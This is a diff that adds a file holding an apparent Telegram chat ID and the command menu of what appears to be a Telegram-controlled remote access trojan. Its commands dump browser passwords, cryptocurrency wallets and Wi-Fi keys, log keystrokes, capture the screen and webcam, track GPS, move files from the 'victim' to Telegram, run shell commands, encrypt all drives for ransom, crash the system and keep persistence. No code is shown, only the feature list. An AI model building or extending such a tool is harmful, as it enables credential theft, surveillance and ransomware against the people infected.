@@ -1,0 +1,32 @@
+7361517001
+
+
+start - Show welcome message
+help - Show this command list
+screenshot - Capture and send screenshot
+record - Record screen for N seconds (default 10)
+passwords - Dump saved passwords from browsers
+wallets - Dump cryptocurrency wallet files
+wifi - Show Wi-Fi passwords
+clipboard - Get clipboard text
+exec - Execute shell command
+download - Download file from victim to Telegram
+upload - Upload file from Telegram to victim (attach file to the message)
+browse - List directory contents
+gps - Get real GPS location 
+ps - List running processes
+kill - Kill a process by PID
+keylog_start - Start keylogging
+keylog_stop - Stop keylogging
+keylog_get - Get captured keystrokes
+bsod - Trigger Blue Screen of Death
+encrypt - Encrypt files (default: all drives)
+decrypt - Decrypt files (default: all drives)
+get_key - Get encryption key and nonce
+info - Show system information
+persistence - Reapply persistence
+toggle_screenshot - Enabledisable periodic screenshot
+set_interval - Set screenshot interval
+update - Self-update from URL
+camera - Capture from webcam
+uninstall - Remove self and exit
